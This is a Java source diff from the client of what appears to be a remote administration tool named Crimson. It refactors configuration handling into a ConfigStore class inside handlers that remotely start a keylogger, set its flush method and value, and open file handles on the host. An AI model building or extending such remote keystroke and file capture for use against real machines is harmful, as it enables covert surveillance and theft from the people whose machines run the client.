@@ -35,6 +35,7 @@ import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
+import com.subterranean_security.crimson.client.store.ConfigStore;
 import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
@@ -314,9 +315,8 @@ public class ClientExecutor extends BasicExecutor {
 
 	private void rq_file_handle(Message m) {
 		log.debug("rq_file_handle");
-		ConnectionStore
-				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid()).setRsFileHandle(
-						RS_FileHandle.newBuilder().setFmid(FileManagerStore.add(new LocalFS(true, true)))));
+		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(m.getRid())
+				.setRsFileHandle(RS_FileHandle.newBuilder().setFmid(FileManagerStore.add(new LocalFS(true, true)))));
 	}
 
 	private void rq_advanced_file_info(Message m) {
@@ -356,7 +356,7 @@ public class ClientExecutor extends BasicExecutor {
 
 	private void rq_get_client_config(Message m) {
 		ConnectionStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(Common.cvid)
-				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(Client.ic)));
+				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(ConfigStore.getConfig())));
 	}
 
 	private void rs_generate(Message m) {
@@ -416,7 +416,8 @@ public class ClientExecutor extends BasicExecutor {
 			if (m.getRqChangeSetting().hasKeyloggerState()) {
 				if (m.getRqChangeSetting().getKeyloggerState() == State.ONLINE) {
 					try {
-						Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
+						Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
+								ConfigStore.getConfig().getKeyloggerFlushValue());
 					} catch (HeadlessException e) {
 						outcome.setResult(false).setComment("HeadlessException");
 						return;
@@ -429,18 +430,19 @@ public class ClientExecutor extends BasicExecutor {
 				}
 			}
 			if (m.getRqChangeSetting().hasFlushMethod()) {
-				Client.ic = ClientConfig.newBuilder().mergeFrom(Client.ic)
-						.setKeyloggerFlushMethod(m.getRqChangeSetting().getFlushMethod()).build();
-				Client.saveIC();
+				ConfigStore.updateConfig(
+						ClientConfig.newBuilder().setKeyloggerFlushMethod(m.getRqChangeSetting().getFlushMethod()));
+				ConfigStore.saveIC();
 			}
 			if (m.getRqChangeSetting().hasFlushValue()) {
-				Client.ic = ClientConfig.newBuilder().mergeFrom(Client.ic)
-						.setKeyloggerFlushValue(m.getRqChangeSetting().getFlushValue()).build();
-				Client.saveIC();
+				ConfigStore.updateConfig(
+						ClientConfig.newBuilder().setKeyloggerFlushValue(m.getRqChangeSetting().getFlushValue()));
+				ConfigStore.saveIC();
 			}
 			if (m.getRqChangeSetting().hasFlushMethod() || m.getRqChangeSetting().hasFlushValue()) {
 				try {
-					Keylogger.start(Client.ic.getKeyloggerFlushMethod(), Client.ic.getKeyloggerFlushValue());
+					Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
+							ConfigStore.getConfig().getKeyloggerFlushValue());
 				} catch (HeadlessException e) {
 					outcome.setResult(false).setComment("HeadlessException");
 					return;
